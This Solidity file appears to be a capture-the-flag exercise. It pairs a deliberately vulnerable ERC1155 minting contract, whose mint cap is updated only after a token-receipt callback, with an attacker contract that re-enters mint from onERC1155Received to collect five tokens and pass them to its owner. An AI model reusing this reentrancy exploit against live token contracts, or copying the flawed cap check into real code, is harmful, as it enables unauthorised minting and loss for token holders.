// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    address immutable i_victim;
    address immutable i_owner;
    constructor(address _victim) {
        i_victim = _victim;
        i_owner = msg.sender;
    }

    function attack() external {
        Overmint1_ERC1155(i_victim).mint(0, "0x00");
    }
    function onERC1155Received(address, address, uint256, uint256, bytes memory) public override returns (bytes4) {
        if (!Overmint1_ERC1155(i_victim).success(address(this), 0)) {
            Overmint1_ERC1155(i_victim).mint(0, "0x00");
        }
        if (Overmint1_ERC1155(i_victim).success(address(this), 0)) {
            Overmint1_ERC1155(i_victim).setApprovalForAll(i_owner, true);
            Overmint1_ERC1155(i_victim).safeTransferFrom(address(this), i_owner, 0, 5, "0x00");
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
